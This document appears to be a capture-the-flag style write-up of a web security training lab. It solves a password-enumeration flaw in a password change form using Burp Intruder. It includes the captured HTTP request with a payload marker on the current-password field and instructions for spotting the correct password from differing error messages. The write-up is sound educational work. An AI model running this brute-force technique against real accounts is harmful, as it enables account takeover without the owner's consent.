## Password brute-force via password change

This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.

Your credentials: wiener:peter
Victim's username: carlos


## Password brute-force via password change functionality

This lab's password change functionality is vulnerable to password enumeration. The application leaks different error messages depending on whether the current password is valid.

To solve the lab, enumerate Carlos's password using the password change feature and access his account page.

## Notes

- /login
- /my-account/change-password
- Username submitted as hidden parameter
- Different error messages depending on password validity
- Burp Intruder required

## Resume

1. Login with `wiener:peter`
2. Capture password change request
3. Send request to Intruder
4. Change username to `carlos`
5. Bruteforce `current-password`
6. Use different new passwords to trigger information leak
7. Filter responses with **Grep - Match**
8. Login with Carlos's credentials

## Solve

Login using `wiener:peter` and go to the password change functionality.

Observe the application's behavior:

- Wrong current password + matching new passwords → account lock
- Wrong current password + different new passwords → `Current password is incorrect`
- Correct current password + different new passwords → `New passwords do not match`

This difference can be used to enumerate valid passwords.

Capture the following request and send it to Intruder:

```http
POST /my-account/change-password HTTP/2
Host: 0a30009503fb938381f5f21e00cc00d9.web-security-academy.net
Cookie: session=Zxwr91NJ0lS6TBFjhCfaOFpZlOQx934G; session=IALaSxTEgWk2FfC2lhbfbdY1cNn99lGS
Content-Length: 76
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0a30009503fb938381f5f21e00cc00d9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a30009503fb938381f5f21e00cc00d9.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=carlos&current-password=§incorrect-password§&new-password-1=123&new-password-2=abc
```

Change the username parameter to:

```txt
carlos
```

Add a payload position only on the `current-password` parameter.

Keep the new password parameters different:

```txt
new-password-1=123
new-password-2=abc
```

In **Payloads**, add the candidate password wordlist.

Then go to **Settings** → **Grep - Match** and add:

```txt
New passwords do not match
```

Run the attack.

One response will contain the message:

```txt
New passwords do not match
```

This means the supplied current password is correct.

The corresponding payload is Carlos's password.

Logout from Wiener and login using Carlos's credentials to solve the lab.